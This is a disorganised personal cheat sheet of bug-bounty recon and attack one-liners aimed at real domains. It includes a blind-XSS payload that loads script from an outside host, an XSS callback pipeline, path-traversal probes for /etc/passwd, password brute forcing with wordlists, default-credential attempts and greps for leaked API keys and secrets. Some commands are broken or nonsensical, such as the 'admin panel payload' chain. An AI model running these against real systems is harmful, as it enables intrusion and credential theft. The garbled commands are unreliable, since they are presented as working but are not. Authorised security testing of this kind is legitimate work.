                cat js.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password ftp            password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
                
             nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
             
                              cat allurls.txt | grep -E "\.js$" >> js.txt                                                                                                    coffin
                              cat js.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30                                        coffin
                              cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config" >> secret.txt                                                    coffin
                              
                              
                              JS Recon : WaybackURLs & HTTPX
waybackurls url | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} python lazyegg[.]py "{}" --js_urls --domains --ips > urls && cat urls | grep '\.' | sort -u  | xargs -I{} httpx -silent -u {} -sc -title -td
             
             tip  
                 cat filtered.txt | grep "\.js\b" > js-files.txt                          filtering js files after using uro to remove depulicate
                 cat js-files.txt | httpx -mc 200 > live-js-files.txt
                 
                   waybackurls “site.com” | grep -Eo ‘https?://[^/]+/[^”]+\.js’ | sed ‘s|^https\?://[^/]\+/||’ | awk -F ‘/’ ‘{print $NF}’
                   
               cat gau.txt | grep ? | tee param.txt     /// filter out url
                  
              cat param.txt | grep -E '\.js$' | tee javascript.txt  filter out javascript
               echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
               
                   search javascript file
                 gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
                 
                 
                 
                 
                       Javascript Enumeration 
     =
        arjun
      paramspider
      katana            katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
      hawkrawler
      gosipder
      https://github.com/m4ll0k/SecretFinder
      cat targets | xargs -n 1 -I {} python3 ~/ParamSpider/paramspider.py --subs False --domain {} --level high | urldedupe >> all-param.txt
      cat targets.txt | hakrawler -d 5 -dr -insecure -t 10 -timeout 360 | tee hakrawler.txt
      cat targets.txt | gospider -S - -q -d 5 -c 10 --sitemap --no-redirect -o gospider.txt
      
      cat jsfiles.txt  | while read url; do python3 SecretFinder.py -i $url -o cli >> secret.txt; done
      cat secret.txt | grep API >> apikeys.txt
check     https://github.com/gwen001/keyhacks.sh
      ./keyhacks.sh Heroku_API_KEY b2868348-d2812-e2q28-e2002ed6630d
      
       tip
      cat all_fingerprints.txt | grep "env\.js" |sort -u | uro| httpx -sc -title -server -mc 200
      
      Check getjs.   
Cat domains.txt    | getjs | tojson
And GoLinkFinder And WayBackRobots
      

      
   

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b http://your.xss.ht
      
           
          tip
          echo "http://target.com" > target.txt
cat traget.txt| grep ".js$" | uniq | jsleak -l -s
cat traget.txt| grep ".js$" | uniq | jsecret
           
          tip  tip
             EASIEST-WAY-TO-FIND-HIDDEN-API-FROM-JS-FILES
      subfinder -d indeed.com -v -o subdomains.txt
      cat subdomains.txt | waybackurls > waybackurls.txt
      cat subdomains.txt | gau > gau.txt
      waymore -i subdomains.txt -mode U > waymore.txt
       Now will collect all urls into a single file naming as allurls
        we will use extensor to find the endpoint file
                 enter the file path :    home/the/filepath/
                 enter the file extension  :  js
                 enter the file name to save the url:  smart.txt
      now we use SecretFinder to find apikeys from js file       
       cat js.txt  | while read url; do python3 /home/kali/tools/SecretFinder/SecretFinder.py  -i $url -o cli; done   
          It will shows all the possible credentials in js file , when you find it just report and enjoy the bounty
          
                  tip
                  katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
                  Download SecretFinder (GitHub)
                  cat {jsfilesgottenfromkatana.txt} | while read url; do python3 SecretFinder/SecretFinder.py  -i $url -o cli; done
                  If anything sensitive found report it.
         
                  
                  tip
                  Subfinder -d Host.com | tee Domains.txt
                  httpx -l Domains.txt | tee Live_Hosts.txt
                  katana -u Live_Hosts.txt | grep ".js$" | tee Js_urls.txt
                  cat Js_urls.txt | Mantra      check output to see if there is any api leak or token
                   curl -H "Authorization: apikey token=X" http://Host.com/users    
                   check if you can perform  API Calls using this token-> Add New User, Delete User ,Reset Any User Password
                   
                   
                     ***  tomnonnom***
                     gau example.net | unfurl -u paths
                     sed 's#/#\n#g' paths.txt | sort -u         Extract all the parts
                     gau example.net | unfurl -u keys
                     ffuf -w paths.txt -u https://example.net/FUZZ

          
      
  
      # Normal Install
      go install github.com/hakluke/hakrawler@latest
      https://github.com/GerbenJavado/LinkFinder

     # Single URL
      echo https://target.com | hakrawler

    # Multiple URLs
     cat urls.txt | hakrawler

     # Include subdomains
      echo https://target.com | hakrawler -subs

     # Get all subdomains of google, find the ones that respond to http(s), crawl them all
     echo target.com | haktrails subdomains | httpx | hakrawler
     #/bin/bash

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht

# save to .sh, and run bash program.sh target.com
     
      using subjs
    $ cat urls.txt | subjs 
   $ subjs -i urls.txt
                
                15
     SENSITIVE DISCOVERY IN JS FILES
     
     SecretFinder.py
      photon
                 
                 
                 
                  
                   PART (1)
                 curl -L -k -s https://www.example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
                 PART 2
                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"#\" sh -c 'linkfinder.py -o cli -i #'"
                 
                 part 3
                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
                  part 4
                  curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'##### %\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
                 
                       TIP  
       ANALYZING-JAVASCRIPT-FILES-TO-FIND-BUGS-                                https://medium.com/@hrofficial62/analyzing-javascript-files-to-find-bugs-7b277d1df435
       
        cat domains.txt | katana | grep js | httpx -mc 200 | tee js.txt
        nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_bugs.txt
        grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp" *.js

                 
             
                 
                 
                 5
                 find old url
                 find all vulnerabulities in old url
                 waybackurl, waybackmachine
                 echo "url"  | waybackurl
                 
                 
                 
                WAYBACKURL FOR BUG HUNTING
              # Only get all urls from wayback machine
                      wayback_machine_downloader http://target.com -c 5 > all_urls.txt



    waybackurl  (check the github usage)
    echo "url" | waybackurl
                 
                
                 
                 waybackurls -dates https://sub.domain.com/foo/bar/ajax.php
                 
                 
                 5@   virtual host
               CONTENT DISCOVERY/PARAMS DISCOVERY  FOR BUG HUNTING     USING FFUF
                 
                 ffuf -w /wordlist/customlist/al.txt -c -u https://smart.com/FUZZ
                  Fuzzing using  (Discover Hidden Endpoints)
                  ffuf -w Discovery/Web-Content/raft-large-directories-lowercase.txt:FUZZ -u http://target.com/FUZZ
                   for extension discovery 
                   ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://target.com/blog/indexFUZZ
                   Discover Get Params 
                ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://target.com/admin/admin.php?FUZZ=key -fs unique-fs-value
                   ffuf -w /home/kali/Desktop/wordlist/fuzz.txt -recursion -u https://mktgadt.example.com/FUZZ          found  https://mktgadt.example.com/audience/login
                   
                   using ffuf to Fuzz  password and email                https://hackermater.medium.com/use-ffuf-to-bypass-burp-suite-intruder-attacks-delay-c5087c912741
                   ffuf -request request.txt --request-proto https -mode pitchfork -w passwords.txt:FUZZPASSWD -w usernames.txt:FUZZUSERS -rate 5 
                  ffuf -request request.txt --request-proto http -mode pitchfork -w /usr/share/wordlists/rockyou.txt:FUZZPASSWD -w  email-list.txt:FUZZEMAIL -mc 200 -u http://127.0.0.1:3000
                  
                  
                  ffuf -w wordlist.txt -u https://host.name/indexFUZZ                to find files with differnet extension
                  ffuf -fc 301,302 -w wordlist.txt -u https://host.name/FUZZ                                filter out 301,302
                  ffuf -rate 50 -w wordlist.txt -u https://host.name/FUZZ                                       rate limit -rate          allways use this
                  
                  ffuf -w ids.txt -u https://host.name/index.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'                   a specific parameter
                  
              This sends POST requests to discover parameter names. For instance, it will test parameters like `username`, `password`, and `email` in the POST data.
                ffuf -w wordlist.txt -u https://host.name/index.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'

         ____    ____             ____
                   
                   Subdomain Fuzzing
       ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
       ffuf -u https://FUZZ.globe.gov -w /usr/share/wordlists/dirb/common.txt -p 1
        ffuf  -u https://globe.gov -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.globe.gov"
        ffuf -u https://ffuf[.]me/FUZZ -w  wordlist.txt -mc all -fc 404,302
        ffuf -u http://ffuf[.]me/cd/recursion/FUZZ -w wordlists.txt -recursion 
        ffuf -u http://ffuf[.]me/cd/ext/logs/FUZZ -w wordlist.txt -e .log,.bak,.conf 
        ffuf -w wordlists.txt -u http://ffuf[.]me/FUZZ -ac
        ffuf -w subdomains.txt -H "Host: FUZZ[.]ffuf[.]me" -u http://ffuf[.]me
        
         
         BURP SUIT
        ffuf -request req.txt -request-proto https -w lfi.txt  -c -mr "root:"        check coffins youtube about ffuf
        req.txt is your raw data of burp with the FUZZ on it
-request-proto is if site is https or http
-w wordlist 
-mr for match regex
        
           tip  tip
           always do subdomain fuzzing
           admin-FUZZ.target.com E.G: admin-stg.target.com
FUZZ-admin.target.com E.G: cert-admin.target.com
adminFUZZ.target.com  E.G: admintest.target.com
FUZZadmin.target.com  E.G  testadmin.target.com
admin.FUZZ.target.com E.G: admin.dev.target.com

    example    found    admintest.Target.com
    ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
        
        
            
            USING GOOGLE  ON COTENT DISCOVERY
            site:example.com filetype:mdf
            site:example.com filetype:zip
            site:example.com filetype:sql
            site:example.com filetype:db
            site:example.com filetype:pdf
            site:trello.com "target"
            site:pastebin.com "target" — leaks
            site:codepen.io "target" — source code.
               Check Bing, Yandex, Duckduckgo,
            


                  
                  
                  waybackurls target.com | grep "\\.js"|uniq|sort
                 waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt   
                 
                 
                 cat domains.txt | waybackurls > urls.txt    
                 
                 for xss
        waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | output.txt
                   
                    echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
                    
                    
                    6
                     SORTING OUT URL 
                    gf,
              
                   cat | gf redirect | tee redirect.txt 
                   
                   echo example.com | waybackurls | sort -u >> waybackdata | gf xss | tee -a xssrparams.txt

                   # Search for testing point with gau and fff
                   gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
                     sort -u urls.txt | fff -s 200 -o out/

                 If you are using gau to fetch some archive data, make sure to exclude a lot of extensions with --blacklist flag:
               cat t | gau --subs --blacklist png,jpg,jpeg,gif,mp3,mp4,svg,woff,woff2,etf,eof,otf,css,exe,ttf,eot

      Extracts Juicy Informations  Extracts Juicy Informations    Extracts Juicy Informations                                             ///this didnt work
    for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done                                                               

       *****       check  cariddi                 https://github.com/edoardottt/cariddi
                     Take a list of domains, crawl urls and scan for endpoints, secrets, api keys, file extensions, tokens and more


               AUTOMATIC REPLACE WITH PAYLOAD
               qsreplace .. check github
               
            

               
               10
               visual recon
                 eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
                 python3 EyeWitness.py -f  alive_subs.txt  --web --threads 10
                    
                 aquatone 
                 cat targets.txt | aquatone
                 $ cat hosts.txt | aquatone -ports 80,443,3000,3001
                 
                 
                 https://github.com/sensepost/gowitness/
                    gowitness file alive_subs.txt
                        Run the Report server
                                   gowittness server
               
               11
               google dorking
               12
               github doeking
               https://www.lopseg.com.br/dork-helper#accessedLinks
               https://github.com/gwen001/github-subdomains
               
               13
               shodan dorking   check my shodan dorks
               - Tips :
1_ Go to SHODAN and get the IP

 2 _ Go to Dirsearch and do a Fuzzing

3_ Obtaining sensitive data
               
               tip
               https://systemweakness.com/using-shodan-to-find-and-exploit-ftp-servers-with-anonymous-access-a-step-by-step-guide-86a5b6e72f75
               Using Shodan to Find and Exploit FTP Servers with Anonymous Access: A Step-by-Step Guide
               
               
               

   
               16
                SUBDOMAIN TAKEOVER        scna and still never relay on can you takeover xyx
                subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl                                        coffin
                https://github.com/Cyber-Guy1/Subdomainer
                https://github.com/anshumanbh/tko-subs
                https://rivalsec.github.io/blog/2022/12/02/meteor.html
                  https://tanishqshahsays.medium.com/mastering-subdomain-takeovers-c9a531fe5d3b
                  https://infosecwriteups.com/meteor-subdomain-takeover-b33034a44aa7
                  https://freedium.cfd/https://medium.com/@BrownBearSec/what-i-learnt-from-reading-217-subdomain-takeover-bug-reports-c0b94eda4366
                  https://hacktivistattacker.medium.com/dns-resolutions-guide-to-subdomain-takeovers-vertical-recon-9da92433e973
                  
                  
     Hostilesubruteforce
     ruby sub-brute.rb
     
     sub404
     python3 sub404.py  -f
     
     subjack
         subjack -w subdomain.txt
     
     bbot
    pipx install bbot
     bbot -t evilcorp.com -f subdomain-enum
     bbot -t evilcorp.com -f subdomain-enum -rf passive             //passive enum
     httpx -l subdomains.txt -o live_subdomains.txt
     
     
     METHODOLOGY             
     checck for subdomian using amass, sublistr  and  axiom // check axiom 
    
       httpx -l subdomains.txt -o live_subdomains.txt       for live subdomian
       subfinder -d example.com | httpx -sc 404 | tee list.txt
          : Proceed to manually inspect each subdomain flagged with a 404 response code
          NOTE
              Pay close attention to any clues or information provided, especially indications of unclaimed S3 buckets or other relevant details. Additionally, use the ‘dig’ command to investigate the CNAME (Canonical Name) records. For instance, utilizing dig command enables the retrieval of the CNAME, revealing where the original subdomain directs to. This step is important in a successful domain takeover.
             dig mail.example.com 
              check this GitHub repo Can I Take Over XYZ
              
       
       OR
       use nuclei template to identify
       nuclei -l subdomain_results.txt -t <nuclei_template_path> -o results.txt
            https://github.com/projectdiscovery/nuclei-templates/tree/main/http/takeovers
            https://github.com/projectdiscovery/nuclei-templates/tree/main/dns
  
    
     GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
     site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
     | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
     
     cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"
     
       tip on subdomain takeover
          using altdnx  or altex tool
          provide a list of sudomain wordlist and map it to an subdomains
          
         altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt           //   dont work , i will check back
         use  httpx 
          httpx  results_output.txt  -sc 404   
          manually check for 404 subdomain  
                 
      17
      download and install    https://github.com/projectdiscovery/nuclei-ai-extension
      
     using nuclie  and nuclie templete
     nuclei -l targets.txt -fr -sa -headless -threads 100 -o nuclei.out -user-agent "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6284.218 Safari/537.36" 
     cat targets.txt | nuclei -t your-template.yaml -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" -H "Referer: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1"

     nuclei --list subdomains_alive.txt --tags cves,osint,tech                                                            coffins
     nuclei --list dirs.txt -c 70 -rl 200 -fhr -lfa -o nuclei.txt -es info
     nuclei -u https://my.target.site    or   nuclei -l /path/to/list-of-targets.txt
     nuclei -u my.target.site:5759
     subfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml
     nuclei -u https:// my.target.site -as      fingerprint website technology
     nuclei -u https://my.target.site -t file/logs/python-app-sql-exceptions.yaml -t exposures/files/pyproject-disclosure.yaml  
     user@kali:~/nuclei-templates$ nuclei -u https://my.target.site -t templates-35.txt
     nuclei -u https://my.target.site -t file/logs -t exposures/files -t cves/2021
      nuclei -u https://example.com -t ./cent-nuclei-templates -tags cve
      nuclei -l urls.txt -t ./cent-nuclei-templates -tags cve
       nuclei -u https://example.com -t nuclei-templates -tags cve
        nuclei -l urls.txt -t nuclei-templates -tags cve
        
        nuclei -l targets.txt -t CVE-2023-22527.yaml           check for all terget,  A template injection vulnerability on 
        
        tip
        You could pass a list of URLs to nuclei to detect file upload forms:
cat urls.txt | nuclei -id exposed-file-upload-form
Also, you could try remaking that template to use headless mode, which will give more results in trade of speed.
        
    
       
        
             18
     ADMIN LOGIN ONLINER
     cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
     
     
     CHECK FOR RCE
     amass enum -active -d $1 -brute -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt
   cat amass.txt | aquatone -ports xlarge -out aqua_$1
   nuclei -l aqua_$1/aquatone_urls.txt -t ~/nuclei-templates -es info -o nuclei_$1.txt
     403 login Bypass
   cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
    git-dumper http://example.com/.git/ output
     
     
     recon takeway tip     recon takeway tip        recon takeway tip       recon takeway tip
    Certificate Search
   using crt
   curl -s "https://crt.sh/?O=Apple%20Inc.&output=json" | jq -r ".[].common_name" | tr A-Z a-z | unfurl format %r.%t | sort -u | tee apple.cert.txt
   
   
   tip     check      https://github.com/intigriti/misconfig-mapper
   When hunting for vulnerabilities, one effective method is to look for internal domains exposed through SSL certificates . This can reveal internal infrastructure or services that might be accessible due to misconfigurations or overlooked security measures. 
     check it on   certificate transparency , openssl, browers, Nmap, SSLScan
   
   Leveraging IP to Asset Discovery
   http://ipip.net/    
   Using CSP Headers
     OSINT
     subfinder -silent -dL domains.txt | anew subs.txt
      while true; do subfinder -dL domains.txt -all | anew subs.txt | httpx | nuclei -t nuclei-templates/ | notify ; sleep 3600; don
     
     easy tip on bug bounty
     search for app for technology       wappalyer
     Shodan:  Search Query  for technology: Set-Cookie: CONCRETE5
    To Hunt for Specific Organisation
   Search Query: Set-Cookie: CONCRETE5 org:”Microsoft Corporation” 
   shodan cli ->  shodan search “Set-Cookie: CONCRETE5” — fields ip_str,port — separator “ “ | awk ‘{print $1”:”$2}’ | tee -a shodan-concrete-ips.txt
   Censys
    Search Query: 443.https.get.body:concrete5
    Writing Nuclei Template  of other vun
    
    
    19
    cors
    python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
    
    
      
       FAST RECON      FAST RECON

subfinder -d viator.com -all  -recursive > subdomain.txt

cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
naabu -list subdomains.txt  -c 50 -nmap-cli 'nmap -sV -sC'  -o naabu-full.txt

katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt

cat   subdomains_alive.txt | gau > newparms.txt
cat newparms.txt | uro > filterparm.txt
cat  filterparam.txt | grep ".js$" > jsfiles.txt


cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"


cat allurls.txt | grep -E "\.js$" >> js.txt

cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ 

echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30

dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json

dirsearch -l subdomains_alive.txt  -i 200,204,403 -x 500,502,429 -R 5 --random-agent -t 50 -F -w /home/coffinxp/oneforall/onelistforallshort.txt -o directory.txt


cat   subdomains_alive.txt | gau > newparms.txt
cat newparms.txt | uro > filterparm.txt

subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters

subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl

python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"

nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors

nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech

cat allurls.txt | gf lfi | nuclei -tags lfi
cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect





tip
  https://x.com/wadgamer10/status/1809475857003446413
    How i am hunting for phpmyadmin logins:-

nuclei -l live-subs.txt -t nuclei-templates/http/exposed-panels/phpmyadmin-panel.yaml

## Then :-

- Test for default creds : root & password,..etc
- Fuzzing 
- Test SQLi
- Response Manipulation


    JENKINS    SECERT  SCANING         JENKINS    SECERT  SCANING                                          https://trufflesecurity.com/blog/trufflehog-now-scans-jenkins-logs
    
    trufflehog jenkins --url https://jenkins.example.com --username admin --password admin
      trufflehog jenkins --url https://jenkins.example.com
      trufflehog git file://./ --only-verified






    
    
                               gauplus
                   cat domain.txt | gauplus -subs | grep -i "\.xlsx" allurls.txt | anew xlsx.txt
                    cat domain.txt | gauplus -subs | grep -i "\.sql" allurls.txt | anew sql.txt
                     cat domain.txt | gauplus -subs | grep -i "\.log" allurls.txt | anew log.txt
                      cat domain.txt | gauplus -subs | grep -i "\.bak" allurls.txt | anew bak.txt
                       cat domain.txt | gauplus -subs | grep "=" | Gxss -c 100 | anew reflected.txt
          cat domain.txt | gauplus -subs | grep "=" > url.txt; httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
          
       cat domain.txt | gauplus -subs | qsreplace "<intearcst-client domain>" | httpx     ssrf
        cat domain.txt | gauplus -subs | grep -i "\.js$" > jsfiles.txt; while read url; do python3 secretfinder.py -l "$url"; done<jsfiles.txt
          cat domain.txt | gauplus -subs | httpx -sc -nc | grep "403\|401" | anew unauted.txt      check 403 bypass github
          
          cat domain.txt | gauplus -subs | httpx -title | grep -l "admin\|login\|dashboard" | anew loginpanel.txt   //add more keyword
          
          
                 5MIN ADMIN PANEL ACCESSED PAYLOAD
cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
          
          
          /SUBDOMAIN-FUZZING-WORTH-35K-
          ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
          Using Burp Match And Replace or using Burp intercept response by

         change 302 Moved Temporarily to 200 OK
          remove Location: /admin/Login.aspx?logout=y
         remove html redirect code 
      ***   1_Always check the redirect response in burp
    ****  2_ If u found a bug in a subdomain and it fixed try Subdomain Fuzzing
              you can use it this way

     USING
        FUZZ-admin.target.com E.G: cert-admin.target.com
         adminFUZZ.target.com  E.G: admintest.target.com
          FUZZadmin.target.com  E.G  testadmin.target.com
          admin-FUZZ.target.com E.G: admin-stg.target.com
         admin.FUZZ.target.com E.G: admin.dev.target.com 
          
          

              KATANA
              tip on katana
              When using katana: 

1) use "-headless" as modern CDN WAFs block many command-line spiders. 

2) use "-js-crawl" to enable  javascript parsing

3) use "-jsluice" to enable syntax-tree (better) javascript parsing

4) use "-display-out-scope" to know when the spider find links to other domains that might be related to your target
 
 cat domains.txt | katana | grep js | httpx -mc 200 | tee js.txt
 katana -list targets.txt -silent -d 6 -rl 25 -jc -f qurl
 katana -list targets.txt -silent -d 6 -rl 25 -jc -f qurl -headless -js-crawl -jsluice -display-out-scope                               //check again. it didint work with ggpoker , the output was low 
 
 katana -u vulnweb.com -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl -jc -xhr -kf -fx -fs dn -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg

 echo "https://yoursite.com"| katana -passive -pss waybackarchive,commoncrawl,alienvault -f qurl | gf sqli | uro |  nuclei -t prsnltemplates/bsqli-time-based.yaml --dast
 
 katana -u vulnweb.com -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl -jc -xhr -kf -fx -fs dn -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg       // Effective way to crawl juicy endpoints
              
          katana -list url_list.txt
          
          echo “https://tesla.com” | katana
          katana -u https://tesla.com,https://google.com
          subfinder -d tesla.com -silent | httpx -silent | katana
          katana scan -u target.com --header "X-Requested-With: XMLHttpRequest" --header "Accept-Language: en-US,en;q=0.9
          katana -list urls.txt  -silent -d 6 -rl 25 -jc -f qurl | tee gapkatana.txt   
          katana scan -u target.com -p xss,sql
   note : Katana supports multiple default fields such as url, path, fqdn, rdn, rurl, qurl, qpath, file, key, value, kv, dir, udir     https://github.com/projectdiscovery/katana?ref=blog.projectdiscovery.io#-field
           katana -u https://yahoo.com -f qurl          
               (No need waybackurls)
     Example:
     echo target | katana -passive -f qurl -pss waybackarchive,commoncrawl, alienvault | tee endpoints
     
     katana” to list all endpoints matching  regex to fetch only those urls having parameters and values (? And =)
     katana -u https://redacted.com -fs dn -iqp -mr "\bhttps?:\/\/[^\s]+?\?[^\s]*=[^\s]*\b" -o katna.txt
     
     
                       
 whatweb -a 3 (url)
 ping -c 1 (ip)
fping -g (ip)/24  
nmap -PEPM -sP -n (ip)/24 


   PORT SCANNING 
   NMAP 
   nmap (url) -p80, 443 -F -A
   nmpa (url) --top -ports 2000
   nmap url -sV
   nmap url -sV --version -intensity 8
   nmap url -Sv --version - all
    
 check /usr/share/nmap    for SCRIPTS 
 
 nmap url --scripts =http-sql-injection
  nmap url --scripts =firewall-bypass -sw
